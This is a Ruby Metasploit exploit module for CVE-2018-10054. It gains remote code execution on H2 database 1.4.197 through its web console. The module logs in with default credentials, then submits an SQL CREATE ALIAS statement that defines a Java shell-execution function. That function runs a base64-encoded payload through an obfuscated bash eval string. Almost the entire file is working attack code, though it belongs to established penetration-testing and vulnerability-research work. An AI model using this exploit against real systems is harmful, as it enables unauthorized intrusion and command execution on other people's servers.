##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'H2 Arbitrary Code Execution using CREATE ALIAS',
      'Description'    => %q{
        'H2 1.4.197, as used in Datomic before 0.9.5697 and other products, allows
         remote code execution because CREATE ALIAS can execute arbitrary Java code.'
      },
      'Author'         => [
        'gambler',         # Proof of concept
        'Daniel Teixeira', # Metasploit module
        'epinna',          # Metasploit module
      ],
      'References'     => [
        ['EDB', '44422'],
        ['CVE', '2018-10054']
      ],
      'DisclosureDate' => 'Apr 9 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => ['unix', 'linux'],
      'Arch'           => [ARCH_CMD],
      'Privileged'     => false,
      'Targets'        => [
        ['H2', {}]
      ],
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(8082),
      OptString.new('JDBC_URL', [true, 'URL to the H2 Database', 'jdbc:h2:~/test']),
      OptString.new('USERNAME', [true, 'H2 Database Username', 'sa']),
      OptString.new('PASSWORD', [false, 'H2 Database Password', nil])
    ])
  end

  def exploit
    base64_payload = Rex::Text.encode_base64("#{payload.encoded}")
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['URI']),
      'method' => 'GET'
    })

    resp=res.body.scan(/jsessionid=(\w+)/).flatten.first

    uri = normalize_uri(target_uri.path, "login.do?jsessionid=#{resp}")

    res = send_request_cgi({
      'method'     => 'POST',
      'uri'        => uri,
      'vars_post'  => {
        'language' => 'en',
        'setting'  => 'Generic+H2+(Embedded)',
        'name'     => 'Generic+H2+(Embedded)',
        'driver'   => 'org.h2.Driver',
        'url'      => datastore['JDBC_URL'],
        'user'     => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
       }
    })
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, "/query.do?jsessionid=#{resp}"),
      'vars_post' => {
        'sql'     => "CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\";  }$$; CALL SHELLEXEC(\'bash -c {eval,$({base64,--decode}<<<#{base64_payload})}&\')"
      }
    })
  end
end
